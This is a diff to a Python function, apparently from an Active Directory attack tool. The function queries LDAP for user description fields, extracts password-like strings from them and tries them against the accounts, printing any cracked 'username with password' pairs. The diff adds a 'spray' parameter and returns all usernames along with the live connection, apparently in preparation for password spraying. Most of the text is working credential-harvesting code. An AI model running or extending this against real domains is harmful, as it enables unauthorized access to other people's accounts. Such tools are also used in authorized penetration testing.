@@ -1,8 +1,8 @@
-from ldap3 import Server, Connection, ALL
+from ldap3 import Connection, ALL
 import re
 from conn import *
 
-def search_passwords(host,auth,domain):
+def search_passwords(host,auth,domain,spray):
     # Connection with LDAP protocol
     conn,server = connection(host,auth,domain)
 
@@ -13,7 +13,7 @@ def search_passwords(host,auth,domain):
     conn.search('dc='+dc1+',dc='+dc2, '(&(objectclass=user)(description=*))', attributes=['sAMAccountName','description'])
 
     users_success = []
-    nbr_success = 0
+    all_users = []
 
     if conn.entries:
         for entry in conn.entries:
@@ -48,16 +48,16 @@ def search_passwords(host,auth,domain):
                     except Exception as e:
                         pass
                     else:
-                        print("[+] Success : "+sAMAccountName+":"+part_pwd)
-                        users_success.append(sAMAccountName+":"+part_pwd)
-                        nbr_success+=1
+                        print("[+] Success : "+sAMAccountName+" with password "+part_pwd)
+                        users_success.append(sAMAccountName+" "+part_pwd)
                         success = True
                 if not success:
                     print("[+] Failed")
+                all_users.append(sAMAccountName)
             else:
                 print("[*] No match")
             print("\n")
     else:
         print("[*] No description found")
 
-    return nbr_success,users_success
+    return all_users,users_success,conn,server
